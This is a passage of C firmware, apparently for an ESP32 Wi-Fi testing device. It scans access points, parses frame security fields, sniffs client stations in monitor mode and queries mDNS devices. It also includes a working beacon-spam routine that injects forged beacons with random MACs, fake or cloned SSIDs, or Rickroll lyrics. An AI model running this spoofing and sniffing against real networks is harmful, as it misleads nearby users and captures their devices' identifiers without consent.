                    pmf_str = "Required";
                    break;
                case WIFI_AUTH_WPA2_WPA3_PSK:
                    auth_str = "WPA2/WPA3";
                    pmf_str = "Required (WPA3)";
                    break;
                case WIFI_AUTH_WAPI_PSK:
                    auth_str = "WAPI";
                    break;
                case WIFI_AUTH_WPA3_ENTERPRISE:
                    auth_str = "WPA3-Enterprise";
                    pmf_str = "Required";
                    break;
                default:
                    auth_str = "Unknown";
                    break;
            }
            
            if (pmf_str) {
                glog("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
            } else {
                glog("     Security: %s\n", auth_str);
            }
        }
#endif
        if (strcmp(company_str, "Unknown") != 0) {
            glog("     Company: %s\n", company_str);
        }
    }
}

static void live_ap_channel_hop_timer_callback(void *arg) {
    if (!live_ap_hopping_active) return;
    live_ap_channel_index = (live_ap_channel_index + 1) % live_ap_channels_len;
    esp_wifi_set_channel(live_ap_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
}

static esp_err_t start_live_ap_channel_hopping(void) {
    if (live_ap_channel_hop_timer != NULL) {
        esp_timer_stop(live_ap_channel_hop_timer);
        esp_timer_delete(live_ap_channel_hop_timer);
        live_ap_channel_hop_timer = NULL;
    }
    live_ap_channel_index = 0;
    esp_wifi_set_channel(live_ap_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
    esp_timer_create_args_t timer_args = {
        .callback = live_ap_channel_hop_timer_callback,
        .name = "live_ap_hop"
    };
    esp_err_t err = esp_timer_create(&timer_args, &live_ap_channel_hop_timer);
    if (err != ESP_OK) return err;
    err = esp_timer_start_periodic(live_ap_channel_hop_timer, SCANSTA_CHANNEL_HOP_INTERVAL_MS * 1000);
    if (err != ESP_OK) {
        esp_timer_delete(live_ap_channel_hop_timer);
        live_ap_channel_hop_timer = NULL;
        return err;
    }
    live_ap_hopping_active = true;
    return ESP_OK;
}

static void stop_live_ap_channel_hopping(void) {
    if (live_ap_channel_hop_timer) {
        esp_timer_stop(live_ap_channel_hop_timer);
        esp_timer_delete(live_ap_channel_hop_timer);
        live_ap_channel_hop_timer = NULL;
    }
    live_ap_hopping_active = false;
}

static bool bssid_already_listed(const uint8_t *bssid) {
    for (int i = 0; i < ap_count; i++) {
        if (memcmp(scanned_aps[i].bssid, bssid, 6) == 0) return true;
    }
    return false;
}
static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 36) return;
    const uint8_t *payload = pkt->payload;
    uint8_t frame_subtype = (payload[0] & 0xF0) >> 4;
    if (frame_subtype != 0x08 && frame_subtype != 0x05) return;

    const wifi_ieee80211_packet_t *ipkt = (const wifi_ieee80211_packet_t *)payload;
    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
    const uint8_t *bssid = hdr->addr3;

    if (bssid_already_listed(bssid)) return;

    int idx = 36;
    char ssid[33] = {0};
    while (idx + 1 < pkt->rx_ctrl.sig_len) {
        uint8_t id = payload[idx];
        uint8_t ie_len = payload[idx + 1];
        if (idx + 2 + ie_len > pkt->rx_ctrl.sig_len) break;
        if (id == 0 && ie_len <= 32) {
            memcpy(ssid, &payload[idx + 2], ie_len);
            ssid[ie_len] = '\0';
            break;
        }
        idx += 2 + ie_len;
    }

    if (ssid[0] == '\0') {
        strncpy(ssid, "<hidden>", sizeof(ssid));
    }

    char sanitized[33];
    sanitize_ssid_and_check_hidden((uint8_t *)ssid, sanitized, sizeof(sanitized));

    // derive security from IEs
    bool has_wpa = false;
    bool has_wpa2 = false;
    bool has_wpa3 = false;
    // capability info privacy bit for WEP detection
    if (pkt->rx_ctrl.sig_len >= 36) {
        uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
        // iterate IEs to find RSN/WPA
        int ie = 36;
        while (ie + 1 < pkt->rx_ctrl.sig_len) {
            uint8_t eid = payload[ie];
            uint8_t elen = payload[ie + 1];
            if (ie + 2 + elen > pkt->rx_ctrl.sig_len) break;
            if (eid == 48 /* RSN */ && elen >= 2) {
                int off = ie + 2;
                if (off + 2 <= ie + 2 + elen) {
                    off += 2; // version
                }
                if (off + 4 <= ie + 2 + elen) {
                    off += 4; // group cipher suite
                }
                if (off + 2 <= ie + 2 + elen) {
                    uint16_t pairwise_count = payload[off] | (payload[off + 1] << 8);
                    off += 2 + 4 * pairwise_count;
                }
                if (off + 2 <= ie + 2 + elen) {
                    uint16_t akm_count = payload[off] | (payload[off + 1] << 8);
                    off += 2;
                    for (uint16_t a = 0; a < akm_count; a++) {
                        if (off + 4 > ie + 2 + elen) break;
                        // OUI 00:0F:AC
                        uint8_t oui0 = payload[off + 0];
                        uint8_t oui1 = payload[off + 1];
                        uint8_t oui2 = payload[off + 2];
                        uint8_t type = payload[off + 3];
                        if (oui0 == 0x00 && oui1 == 0x0F && oui2 == 0xAC) {
                            if (type == 2) has_wpa2 = true;      // PSK
                            if (type == 8) has_wpa3 = true;      // SAE
                        }
                        off += 4;
                    }
                }
            } else if (eid == 221 /* Vendor */ && elen >= 4) {
                // WPA (00:50:F2, type 1)
                if (payload[ie + 2] == 0x00 && payload[ie + 3] == 0x50 && payload[ie + 4] == 0xF2 && payload[ie + 5] == 0x01) {
                    has_wpa = true;
                }
            }
            ie += 2 + elen;
        }
    }

    if (scanned_aps == NULL) {
        scanned_aps = calloc(MAX_SCANNED_APS, sizeof(wifi_ap_record_t));
        ap_count = 0;
    }
    if (scanned_aps && ap_count < MAX_SCANNED_APS) {
        wifi_ap_record_t *rec = &scanned_aps[ap_count++];
        memset(rec, 0, sizeof(*rec));
        memcpy(rec->bssid, bssid, 6);
        strncpy((char *)rec->ssid, sanitized, sizeof(rec->ssid));
        rec->rssi = pkt->rx_ctrl.rssi;
        rec->primary = pkt->rx_ctrl.channel;
        // map to closest auth mode
        if (has_wpa3 && has_wpa2) rec->authmode = WIFI_AUTH_WPA2_WPA3_PSK;
        else if (has_wpa3) rec->authmode = WIFI_AUTH_WPA3_PSK;
        else if (has_wpa2) rec->authmode = WIFI_AUTH_WPA2_PSK;
        else if (has_wpa) rec->authmode = WIFI_AUTH_WPA_PSK;
        else {
            // check WEP via privacy bit
            uint16_t cap = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
            if (cap & 0x0010) rec->authmode = WIFI_AUTH_WEP; else rec->authmode = WIFI_AUTH_OPEN;
        }
    }

    uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000);
    if (now_ms - last_live_print_ms < 100) return;
    last_live_print_ms = now_ms;

    while (live_last_printed_index < ap_count) {
        uint16_t idx = live_last_printed_index;
        wifi_ap_record_t *rec = &scanned_aps[idx];
        wifi_manager_print_ap_entry_formatted(idx, rec, true);
        live_last_printed_index++;
    }
}

void wifi_manager_start_live_ap_scan(void) {
    ap_manager_stop_services();
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    if (scanned_aps) { free(scanned_aps); scanned_aps = NULL; }
    ap_count = 0;
    live_last_printed_index = 0;
    last_live_print_ms = 0;
    wifi_manager_start_monitor_mode(live_ap_scan_callback);
    start_live_ap_channel_hopping();
    printf("Live AP scan started. Type 'stopscan' to stop.\n");
    TERMINAL_VIEW_ADD_TEXT("Live AP scan started.\n");
}

esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
    uint8_t packet[256] = {
        0x80, 0x00, 0x00, 0x00,                         // Frame Control, Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination address (broadcast)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source address (randomized later)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // BSSID (randomized later)
        0xc0, 0x6c,                                     // Seq-ctl (sequence control)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (set to 0)
        0x64, 0x00,                                     // Beacon interval (100 TU)
        0x11, 0x04,                                     // Capability info (ESS)
    };
    // if a station on the AP has an IP, don't hop channels; send on current channel only
    int start_channel = 1;
    int end_channel = 11;
    if (ap_sta_has_ip) {
        uint8_t primary_channel;
        wifi_second_chan_t second_channel;
        esp_wifi_get_channel(&primary_channel, &second_channel);
        start_channel = primary_channel;
        end_channel = primary_channel;
    }

    for (int ch = start_channel; ch <= end_channel; ch++) {
        if (!ap_sta_has_ip) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        }
        generate_random_mac(&packet[10]);
        memcpy(&packet[16], &packet[10], 6);

        char ssid_buffer[RANDOM_SSID_LEN + 1];
        if (ssid == NULL) {
            generate_random_ssid(ssid_buffer, RANDOM_SSID_LEN + 1);
            ssid = ssid_buffer;
        }

        uint8_t ssid_len = strlen(ssid);
        packet[37] = ssid_len;
        memcpy(&packet[38], ssid, ssid_len);

        uint8_t *supported_rates_ie = &packet[38 + ssid_len];
        supported_rates_ie[0] = 0x01; // Supported Rates IE tag
        supported_rates_ie[1] = 0x08; // Length (8 rates)
        supported_rates_ie[2] = 0x82; // 1 Mbps
        supported_rates_ie[3] = 0x84; // 2 Mbps
        supported_rates_ie[4] = 0x8B; // 5.5 Mbps
        supported_rates_ie[5] = 0x96; // 11 Mbps
        supported_rates_ie[6] = 0x24; // 18 Mbps
        supported_rates_ie[7] = 0x30; // 24 Mbps
        supported_rates_ie[8] = 0x48; // 36 Mbps
        supported_rates_ie[9] = 0x6C; // 54 Mbps

        uint8_t *ds_param_set_ie = &supported_rates_ie[10];
        ds_param_set_ie[0] = 0x03; // DS Parameter Set IE tag
        ds_param_set_ie[1] = 0x01; // Length (1 byte)

        uint8_t primary_channel;
        wifi_second_chan_t second_channel;
        esp_wifi_get_channel(&primary_channel, &second_channel);
        ds_param_set_ie[2] = primary_channel; // Set the current channel

        // Add HE Capabilities (for Wi-Fi 6 detection)
        uint8_t *he_capabilities_ie = &ds_param_set_ie[3];
        he_capabilities_ie[0] = 0xFF; // Vendor-Specific IE tag (802.11ax capabilities)
        he_capabilities_ie[1] = 0x0D; // Length of HE Capabilities (13 bytes)

        // Wi-Fi Alliance OUI (00:50:6f) for 802.11ax (Wi-Fi 6)
        he_capabilities_ie[2] = 0x50; // OUI byte 1
        he_capabilities_ie[3] = 0x6f; // OUI byte 2
        he_capabilities_ie[4] = 0x9A; // OUI byte 3 (OUI type)

        // Wi-Fi 6 HE Capabilities: a simplified example of capabilities
        he_capabilities_ie[5] = 0x00;  // HE MAC capabilities info (placeholder)
        he_capabilities_ie[6] = 0x08;  // HE PHY capabilities info (supports 80 MHz)
        he_capabilities_ie[7] = 0x00;  // Other HE PHY capabilities
        he_capabilities_ie[8] = 0x00;  // More PHY capabilities (placeholder)
        he_capabilities_ie[9] = 0x40;  // Spatial streams info (2x2 MIMO)
        he_capabilities_ie[10] = 0x00; // More PHY capabilities
        he_capabilities_ie[11] = 0x00; // Even more PHY capabilities
        he_capabilities_ie[12] = 0x01; // Final PHY capabilities (Wi-Fi 6 capabilities set)

        size_t packet_size = (38 + ssid_len + 12 + 3 + 13); // Adjust packet size

        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
        if (err != ESP_OK) {
            printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
            return err;
        }

        vTaskDelay(pdMS_TO_TICKS(10));
        if (ap_sta_has_ip) break; // only one transmit when a client has IP
    }

    return ESP_OK;
}

void wifi_manager_stop_beacon() {
    if (beacon_task_running) {
        printf("Stopping beacon transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Stopping beacon transmission...\n");

        // Stop the beacon task
        if (beacon_task_handle != NULL) {
            vTaskDelete(beacon_task_handle);
            beacon_task_handle = NULL;
            beacon_task_running = false;
        }

        // Turn off RGB indicator
        rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);

        // Stop WiFi completely
        esp_wifi_stop();
        vTaskDelay(pdMS_TO_TICKS(500)); // Give some time for WiFi to stop

        // Reset WiFi mode
        esp_wifi_set_mode(WIFI_MODE_AP);

        // Now restart services
        ap_manager_init();
        status_display_show_status("Beacon Stopped");
    } else {
        printf("No beacon transmission running.\n");
        TERMINAL_VIEW_ADD_TEXT("No beacon transmission running.\n");
        status_display_show_status("No Beacon Active");
    }
}
void wifi_manager_start_ip_lookup() {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK || ap_info.rssi == 0) {
        printf("Not connected to an Access Point.\n");
        TERMINAL_VIEW_ADD_TEXT("Not connected to an Access Point.\n");
        return;
    }

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"), &ip_info) ==
        ESP_OK) {
        printf("Connected.\nProceeding with IP lookup...\n");
        TERMINAL_VIEW_ADD_TEXT("Connected.\nProceeding with IP lookup...\n");

        int device_count = 0;
        struct DeviceInfo devices[MAX_DEVICES];
        (void)devices;

        for (int s = 0; s < NUM_SERVICES; s++) {
            int retries = 0;
            mdns_result_t *mdnsresult = NULL;

            if (mdnsresult == NULL) {
                while (retries < 5 && mdnsresult == NULL) {
                    esp_err_t qret = mdns_query_ptr(services[s].query, "_tcp", 2000, 30, &mdnsresult);

                    if (mdnsresult == NULL) {
                        retries++;
                        TERMINAL_VIEW_ADD_TEXT("Retrying mDNS query for service: %s (Attempt %d)\n",
                                               services[s].query, retries);
                        printf("Retrying mDNS query for service: %s (Attempt %d)\n",
                               services[s].query, retries);
                        vTaskDelay(pdMS_TO_TICKS(500));
                    }
                }
            }

            if (mdnsresult != NULL) {
                printf("mDNS query succeeded for service: %s\n", services[s].query);
                TERMINAL_VIEW_ADD_TEXT("mDNS query succeeded for service: %s\n", services[s].query);

                mdns_result_t *current_result = mdnsresult;
                while (current_result != NULL && device_count < MAX_DEVICES) {
                    char ip_str[INET_ADDRSTRLEN] = {0};
                    mdns_ip_addr_t *addr_item = current_result->addr;
                    bool has_v4 = false;
                    while (addr_item != NULL) {
                        if (addr_item->addr.type == IPADDR_TYPE_V4) {
                            inet_ntop(AF_INET, &addr_item->addr.u_addr.ip4, ip_str, INET_ADDRSTRLEN);
                            has_v4 = true;
                            break;
                        }
                        addr_item = addr_item->next;
                    }
                    if (!has_v4) {
                        strncpy(ip_str, "0.0.0.0", sizeof(ip_str));
                    }

                    printf("Device at: %s\n", ip_str);
                    printf("  Name: %s\n", current_result->hostname);
                    printf("  Type: %s\n", services[s].type);
                    printf("  Port: %u\n", current_result->port);
                    TERMINAL_VIEW_ADD_TEXT("Device at: %s\n", ip_str);
                    TERMINAL_VIEW_ADD_TEXT("  Name: %s\n", current_result->hostname);
                    TERMINAL_VIEW_ADD_TEXT("  Type: %s\n", services[s].type);
                    TERMINAL_VIEW_ADD_TEXT("  Port: %u\n", current_result->port);
                    device_count++;

                    current_result = current_result->next;
                }

                mdns_query_results_free(mdnsresult);
            } else {
                printf("Failed to find devices for service: %s after %d retries\n",
                       services[s].query, retries);
                TERMINAL_VIEW_ADD_TEXT("Failed to find devices for service: %s after %d retries\n",
                                       services[s].query, retries);
            }
        }
    } else {
        printf("Can't recieve network interface info.\n");
        TERMINAL_VIEW_ADD_TEXT("Can't recieve network interface info.\n");
    }

    printf("IP Scan Done.\n");
    TERMINAL_VIEW_ADD_TEXT("IP Scan Done...\n");
}
void wifi_manager_connect_wifi(const char *ssid, const char *password) {
    printf("Connecting to WiFi: %s\n", ssid);
    TERMINAL_VIEW_ADD_TEXT("Connecting to WiFi: %s\n", ssid);
    
    wifi_config_t wifi_config = {0};
    
    // Copy SSID and password safely
    strlcpy((char *)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
    strlcpy((char *)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));
    
    // Set auth mode - use WPA_WPA2_PSK for better compatibility with modern routers
    if (strlen(password) > 0) {
        wifi_config.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
        wifi_config.sta.pmf_cfg.capable = true;
        wifi_config.sta.pmf_cfg.required = false;
    } else {
        wifi_config.sta.threshold.authmode = WIFI_AUTH_OPEN;
    }
    
    // Enable scan method for better AP selection
    wifi_config.sta.scan_method = WIFI_FAST_SCAN;
    wifi_config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
    
    // Ensure clean start state
    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT | WIFI_CONNECTING_BIT);
    
    // Set the connecting bit BEFORE any WiFi operations
    xEventGroupSetBits(wifi_event_group, WIFI_CONNECTING_BIT);
    
    // Stop WiFi completely to ensure clean state
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Reconfigure and restart WiFi
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    // Wait for WiFi to be ready
    vTaskDelay(pdMS_TO_TICKS(1000));

    int retry_count = 0;
    const int max_retries = 5;  // Reduced retry count for cleaner logs
    bool connected = false;

    while (retry_count < max_retries && !connected) {
        if (retry_count > 0) {
            printf("Retry attempt %d/%d...\n", retry_count, max_retries);
            TERMINAL_VIEW_ADD_TEXT("Retry attempt %d/%d...\n", retry_count, max_retries);
        }
        
        esp_err_t ret = esp_wifi_connect();
        if (ret == ESP_ERR_WIFI_CONN) {
            ret = ESP_OK; // Already connecting, handled elsewhere
        }

        if (ret == ESP_OK) {
            // Wait for connection with timeout
            EventBits_t bits = xEventGroupWaitBits(wifi_event_group, 
                WIFI_CONNECTED_BIT, pdFALSE, pdTRUE, pdMS_TO_TICKS(10000));
            
            if (bits & WIFI_CONNECTED_BIT) {
                connected = true;
                printf("Successfully connected to %s\n", ssid);
                TERMINAL_VIEW_ADD_TEXT("Successfully connected to %s\n", ssid);
                break;
            }
        } else {
            printf("Connection initiation failed (error: %d)\n", ret);
            TERMINAL_VIEW_ADD_TEXT("Connection initiation failed (error: %d)\n", ret);
        }

        if (!connected) {
            esp_wifi_disconnect();
            retry_count++;
            if (retry_count < max_retries) {
                vTaskDelay(pdMS_TO_TICKS(3000)); // 3 second delay between retries
            }
        }
    }

    // Clear the connecting bit as we're done with the manual connection attempt
    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTING_BIT);

    if (!connected) {
        TERMINAL_VIEW_ADD_TEXT("Failed to connect to %s after %d attempts\n", ssid, max_retries);
        printf("Failed to connect to %s after %d attempts\n", ssid, max_retries);
        esp_wifi_disconnect();
    }
}

void wifi_beacon_task(void *param) {
    const char *ssid = (const char *)param;

    // Array to store lines of the chorus
    const char *rickroll_lyrics[] = {"Never gonna give you up",
                                     "Never gonna let you down",
                                     "Never gonna run around and desert you",
                                     "Never gonna make you cry",
                                     "Never gonna say goodbye",
                                     "Never gonna tell a lie and hurt you"};
    int num_lines = 5;
    int line_index = 0;

    int IsRickRoll = ssid != NULL ? (strcmp(ssid, "RICKROLL") == 0) : false;
    int IsAPList = ssid != NULL ? (strcmp(ssid, "APLISTMODE") == 0) : false;

    while (1) {
        if (IsRickRoll) {
            wifi_manager_broadcast_ap(rickroll_lyrics[line_index]);

            line_index = (line_index + 1) % num_lines;
        } else if (IsAPList) {
            for (int i = 0; i < ap_count; i++) {
                wifi_manager_broadcast_ap((const char *)scanned_aps[i].ssid);
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
        } else {
            wifi_manager_broadcast_ap(ssid);
        }

        vTaskDelay(settings_get_broadcast_speed(&G_Settings) / portTICK_PERIOD_MS);
    }
}

void wifi_manager_start_beacon(const char *ssid) {
    if (!beacon_task_running) {
        ap_manager_stop_services();
        printf("Starting beacon transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Starting beacon transmission...\n");
        status_display_show_status("Beacon Starting");
        configure_hidden_ap();
        esp_wifi_start();
        xTaskCreate(wifi_beacon_task, "beacon_task", 2048, (void *)ssid, 5, &beacon_task_handle);
        beacon_task_running = true;
        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
    } else {
        printf("Beacon transmission already running.\n");
        TERMINAL_VIEW_ADD_TEXT("Beacon transmission already running.\n");
        status_display_show_status("Beacon Active");
    }
}

// Function to provide access to the last scan results
void wifi_manager_get_scan_results_data(uint16_t *count, wifi_ap_record_t **aps) {
    *count = ap_count;
    *aps = scanned_aps;
}

void wifi_manager_start_scan_with_time(int seconds) {
    ap_manager_stop_services();
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };

    rgb_manager_set_color(&rgb_manager, -1, 50, 255, 50, false);

    printf("WiFi Scan started\n");
    printf("Please wait %d Seconds...\n", seconds);
    TERMINAL_VIEW_ADD_TEXT("WiFi Scan started\n");
    {
        char buf[64]; snprintf(buf, sizeof(buf), "Please wait %d Seconds...\n", seconds);
        TERMINAL_VIEW_ADD_TEXT(buf);
    }

    esp_err_t err = esp_wifi_scan_start(&scan_config, false);
    if (err != ESP_OK) {
        printf("WiFi scan failed to start: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
        return;
    }

    vTaskDelay(pdMS_TO_TICKS(seconds * 1000));

    wifi_manager_stop_scan();
    ESP_ERROR_CHECK(esp_wifi_stop());
    // ESP_ERROR_CHECK(ap_manager_start_services()); // Removed: Rely on caller (handle_combined_scan) to restart AP services
}

// Station Scan Channel Hopping Callback
static void scansta_channel_hop_timer_callback(void *arg) {
    if (!scansta_hopping_active) return; // Check if hopping should be active

    scansta_current_channel = (scansta_current_channel % SCANSTA_MAX_WIFI_CHANNEL) + 1;
    esp_wifi_set_channel(scansta_current_channel, WIFI_SECOND_CHAN_NONE);
    // ESP_LOGI(TAG, "Station Scan Hopped to Channel: %d", scansta_current_channel); // Optional: for debugging
}

// Start the channel hopping timer for station scanning
static esp_err_t start_scansta_channel_hopping(void) {
    if (scansta_channel_hop_timer != NULL) {
        ESP_LOGW(TAG, "Scansta channel hop timer already exists. Stopping and deleting first.");
        esp_timer_stop(scansta_channel_hop_timer);
        esp_timer_delete(scansta_channel_hop_timer);
        scansta_channel_hop_timer = NULL;
    }

    scansta_current_channel = 1; // Start from channel 1
    esp_wifi_set_channel(scansta_current_channel, WIFI_SECOND_CHAN_NONE); // Set initial channel

    esp_timer_create_args_t timer_args = {
        .callback = scansta_channel_hop_timer_callback,
        .name = "scansta_channel_hop"
    };

    esp_err_t err = esp_timer_create(&timer_args, &scansta_channel_hop_timer);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to create scansta channel hop timer: %s", esp_err_to_name(err));
        return err;
    }

    err = esp_timer_start_periodic(scansta_channel_hop_timer, SCANSTA_CHANNEL_HOP_INTERVAL_MS * 1000);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start scansta channel hop timer: %s", esp_err_to_name(err));
        esp_timer_delete(scansta_channel_hop_timer); // Clean up timer if start fails
        scansta_channel_hop_timer = NULL;
        return err;
    }

    scansta_hopping_active = true;
    ESP_LOGI(TAG, "Station Scan Channel Hopping Started.");
    return ESP_OK;
}

// Stop the channel hopping timer for station scanning
static void stop_scansta_channel_hopping(void) {
    if (scansta_channel_hop_timer) {
        esp_timer_stop(scansta_channel_hop_timer);
        esp_timer_delete(scansta_channel_hop_timer);
        scansta_channel_hop_timer = NULL;
        scansta_hopping_active = false;
        ESP_LOGI(TAG, "Station Scan Channel Hopping Stopped.");
    }
}

// Function to specifically start station scanning with channel hopping
void wifi_manager_start_station_scan() {
    // Ensure we have a list of APs to compare against first
    if (scanned_aps == NULL || ap_count == 0) {
        printf("No APs scanned previously. Performing initial scan...\n");
        TERMINAL_VIEW_ADD_TEXT("No APs scanned previously. Performing initial scan...\n");

        // Perform a synchronous scan
        ap_manager_stop_services(); // Stop other services that might interfere
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
        ESP_ERROR_CHECK(esp_wifi_start());

        wifi_scan_config_t scan_config = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true,
            // Use a reasonable scan time
            .scan_time = {.active.min = 450, .active.max = 500, .passive = 500}
        };

        esp_err_t err = esp_wifi_scan_start(&scan_config, true); // Block until scan done

        if (err == ESP_OK) {
            // Get the results directly, similar to wifi_manager_stop_scan()
            uint16_t initial_ap_count = 0;
            err = esp_wifi_scan_get_ap_num(&initial_ap_count);
            if (err == ESP_OK) {
                 char log_buf[128];
                 snprintf(log_buf, sizeof(log_buf), "Initial scan found %u access points\n", initial_ap_count);
                 printf("%s", log_buf);
                 TERMINAL_VIEW_ADD_TEXT(log_buf);

                 if (initial_ap_count > 0) {
                    if (scanned_aps != NULL) {
                        free(scanned_aps);
                        scanned_aps = NULL;
                    }
                    scanned_aps = calloc(initial_ap_count, sizeof(wifi_ap_record_t));
                    if (scanned_aps == NULL) {
                        printf("Failed to allocate memory for AP info\n");
                        ap_count = 0;
                    } else {
                        uint16_t actual_ap_count = initial_ap_count;
                        err = esp_wifi_scan_get_ap_records(&actual_ap_count, scanned_aps);
                        if (err != ESP_OK) {
                            printf("Failed to get AP records: %s\n", esp_err_to_name(err));
                            free(scanned_aps);
                            scanned_aps = NULL;
                            ap_count = 0;
                        } else {
                             ap_count = actual_ap_count;

                              // ---- ADD THIS BLOCK START ----
                              printf("--- Known AP BSSIDs for Station Scan ---\n");
                              TERMINAL_VIEW_ADD_TEXT("--- Known AP BSSIDs for Station Scan ---\n");
                              for (int k = 0; k < ap_count; k++) {
                                  char bssid_log_buf[128];
                                  snprintf(bssid_log_buf, sizeof(bssid_log_buf), "[%d] BSSID: %02X:%02X:%02X:%02X:%02X:%02X (SSID: %.*s)\n", k,
                                         scanned_aps[k].bssid[0], scanned_aps[k].bssid[1],
                                         scanned_aps[k].bssid[2], scanned_aps[k].bssid[3],
                                         scanned_aps[k].bssid[4], scanned_aps[k].bssid[5],
                                         32, scanned_aps[k].ssid); // Print SSID for context
                                  printf("%s", bssid_log_buf);
                                  TERMINAL_VIEW_ADD_TEXT(bssid_log_buf);
                              }
                              printf("----------------------------------------\n");
                              TERMINAL_VIEW_ADD_TEXT("----------------------------------------\n");
                              // ---- ADD THIS BLOCK END ----
                         }
                     }
                 } else {
                      printf("Initial scan found no access points\n");
                      TERMINAL_VIEW_ADD_TEXT("Initial scan found no access points\n");
                      ap_count = 0;
                 }
            } else {
                printf("Failed to get AP count after initial scan: %s\n", esp_err_to_name(err));
                TERMINAL_VIEW_ADD_TEXT("Failed get AP count\n");
                 ap_count = 0;
            }

        } else {
            printf("Initial AP scan failed: %s\n", esp_err_to_name(err));
            TERMINAL_VIEW_ADD_TEXT("Initial AP scan failed.\n");
            ap_count = 0; // Ensure ap_count reflects failure
        }

        // Stop STA mode before setting monitor mode
        ESP_ERROR_CHECK(esp_wifi_stop());
        // Note: AP Manager services are not restarted here, as monitor mode is intended next
    } else {
         printf("Using previously scanned AP list (%d APs).\n", ap_count);
         TERMINAL_VIEW_ADD_TEXT("Using cached AP list.\n");
    }
    
    // Build list of unique channels for channel hopping
    if (scansta_channel_list) { free(scansta_channel_list); scansta_channel_list = NULL; }
    scansta_channel_list_len = 0;
    scansta_channel_list = calloc(ap_count, sizeof(int));
    if (scansta_channel_list) {
        for (int k = 0; k < ap_count; k++) {
            int ch = scanned_aps[k].primary;
            bool found = false;
            for (size_t m = 0; m < scansta_channel_list_len; m++) {
                if (scansta_channel_list[m] == ch) { found = true; break; }
            }
            if (!found) { scansta_channel_list[scansta_channel_list_len++] = ch; }
        }
    }
    scansta_channel_list_idx = 0;

    // Now start monitor mode with the callback
    wifi_manager_start_monitor_mode(wifi_stations_sniffer_callback);
    // Start channel hopping for station scan
    start_scansta_channel_hopping();
    printf("Started Station Scan (Channel Hopping Enabled)...\n");
    TERMINAL_VIEW_ADD_TEXT("Started Station Scan (Hopping)...\n");
}
// Print combined AP/Station scan results in ASCII chart
void wifi_manager_scanall_chart() {
    if (ap_count == 0) {
        printf("No APs found during scan.\n");
        TERMINAL_VIEW_ADD_TEXT("No APs found during scan.\n");
        return;
    }

    printf("\n--- Combined AP and Station Scan Results ---\n\n");
    TERMINAL_VIEW_ADD_TEXT("\n--- Combined AP and Station Scan Results ---\n\n");

    const char* ap_header_top =    "┌──────────────────────────────────┬───────────────────┬──────┬───────────┐";
    const char* ap_header_mid =    "│ SSID                             │ BSSID             │ Chan │ Company   │";
    const char* ap_header_bottom = "├──────────────────────────────────┼───────────────────┼──────┼───────────┤";
    const char* ap_format =        "│ %-32.32s │ %02X:%02X:%02X:%02X:%02X:%02X │ %-4d │ %-9.9s │";
    const char* ap_separator =     "├──────────────────────────────────┼───────────────────┼──────┼───────────┤";
    const char* ap_footer =        "└──────────────────────────────────┴───────────────────┴──────┴───────────┘";
    const char* sta_format =       "│   -> STA: %02X:%02X:%02X:%02X:%02X:%02X                                             │"; // Formatted station line


    // Print Header Once
    printf("%s\n", ap_header_top);
    printf("%s\n", ap_header_mid);
    printf("%s\n", ap_header_bottom);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_top);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_mid);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_bottom);


    for (uint16_t i = 0; i < ap_count; i++) {
        char sanitized_ssid[33];
        sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));

